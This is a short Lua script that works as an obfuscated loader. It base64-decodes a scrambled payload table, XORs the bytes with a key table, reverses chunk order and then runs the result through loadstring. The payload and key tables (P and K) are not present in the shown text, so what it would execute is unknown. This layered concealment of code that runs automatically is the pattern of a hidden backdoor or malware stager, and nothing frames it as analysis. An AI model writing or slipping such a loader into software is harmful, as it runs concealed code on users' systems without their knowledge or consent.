local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local R={}
for i=1,#B do R[string.sub(B,i,i)]=i-1 end
local function X(a,b)
 local r,p=0,1
 while a>0 or b>0 do local x=a%2; local y=b%2; if x~=y then r=r+p end; a=math.floor(a/2); b=math.floor(b/2); p=p*2 end
 return r
end
local function D(s)
 local o={}
 for i=1,#s,4 do
  local a=R[string.sub(s,i,i)] or 0
  local b=R[string.sub(s,i+1,i+1)] or 0
  local c=R[string.sub(s,i+2,i+2)] or 0
  local d=R[string.sub(s,i+3,i+3)] or 0
  local x=a*262144+b*4096+c*64+d
  o[#o+1]=string.char(math.floor(x/65536)%256)
  if i+2<=#s then o[#o+1]=string.char(math.floor(x/256)%256) end
  if i+3<=#s then o[#o+1]=string.char(x%256) end
 end
 local z=table.concat(o); local q={}
 for i=1,#z do q[i]=string.char(X(string.byte(z,i),K[(i-1)%#K+1])) end
 return table.concat(q)
end
local s=table.concat(P); local z={}
for i=1,#s,104 do
 local g=string.sub(s,i,i+103); local t={}
 for j=1,#g,8 do t[#t+1]=string.sub(g,j,j+7) end
 for j=#t,1,-1 do z[#z+1]=t[j] end
end
local f=loadstring(D(table.concat(z)))
if type(f)=="function" then return f() end
